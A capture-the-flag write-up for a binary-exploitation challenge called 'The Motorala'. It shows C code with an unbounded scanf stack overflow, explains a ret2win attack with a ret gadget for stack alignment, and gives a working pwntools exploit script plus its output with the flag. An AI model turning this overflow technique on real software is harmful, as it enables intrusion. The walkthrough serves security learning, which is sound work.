### The Motorala (84 Solves, 100 Pts)
The vulnerability in question lie in `chall.c`'s `login()` function.
```c
void view_message() {
	int fd = open("./flag.txt", O_RDONLY);
	char* flag = calloc(0x50, sizeof(char));
	read(fd , flag, 0x50);
	close(fd);
	slow_type("\n\e[1;93mAfter several intense attempts, you successfully breach the phone's defenses.\nUnlocking its secrets, you uncover a massive revelation that holds the power to reshape everything.\nThe once-elusive truth is now in your hands, but little do you know, the plot deepens, and the journey through the clandestine hideout takes an unexpected turn, becoming even more complicated.\n\e[0m");
	printf("\n%s\n", flag);
	exit(0);
}

void login() {
	char attempt[0x30];
	int count = 5;

	for (int i = 0; i < 5; i++) {
		memset(attempt, 0, 0x30);
		printf("\e[1;91m%d TRIES LEFT.\n\e[0m", 5-i);
		printf("PIN: ");
		scanf("%s", attempt);
		if (!strcmp(attempt, pin)) {
			view_message();
		}
	}
	slow_type("\n\e[1;33mAfter five unsuccessful attempts, the phone begins to emit an alarming heat, escalating to a point of no return. In a sudden burst of intensity, it explodes, sealing your fate.\e[0m\n\n");
}
```
Much like `Baby Goods`, `login()` allows us to overwrite the stack frame and modify our return address to point to `view_message()` directly once `login()` is done running.

Unfortunately, this does lead to a stack misalignment and as `view_message()` calls a `movabs` asm instruction call somewhere within it, this would lead to a `SIGSEGV` as the stack is misaligned by 8 bytes. We thus add a `ret` first before `view_message()` to realign the stack back to its proper position.

In essence, instead of doing ` <login_stack_frame> | <overwrite rbp> | &view_message`, we do ` <login_stack_frame> | <overwrite rbp> | &ret | &view_message`. We use the `ROPgadget` tool to obtain an address in the binary that essentially does `ret`, and so when `login()` ends, `ret` is first called as `login()` returns to a `ret;` call, which then looks at the next value in the stack, being `view_message()`, which is then called resulting in the flag being printed.

As we see here,
`sol.py`
```py
from pwn import *

r = remote('challs.nusgreyhats.org', 30211)
#r = process('./chall')
#gdb.attach(r, gdbscript="b*login+130")
view_message = 0x40138e
ret_gadget = 0x40101a
r.sendline(b'A'*72 + p64(ret_gadget) + p64(view_message))
r.interactive()
```

```sh
\x1b[1;94mLocked behind a PIN, you attempt to find a way to break into the cellphone, despite only having 5 tries.\x1b[

5 TRIES LEFT.
PIN:
\x1b[1;33mAfter five unsuccessful attempts, the phone begins to emit an alarming heat, escalating to a point of no return. In a sudden burst of intensity, it explodes, sealing your fate.\x1b[0m


\x1b[1;93mAfter several intense attempts, you successfully breach the phone's defenses.
Unlocking its secrets, you uncover a massive revelation that holds the power to reshape everything.
The once-elusive truth is now in your hands, but little do you know, the plot deepens, and the journey through the clandestine hideout takes an unexpected turn, becoming even more complicated.
\x1b[0m
grey{g00d_w4rmup_for_p4rt_2_hehe}

[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to challs.nusgreyhats.org port 30211
```
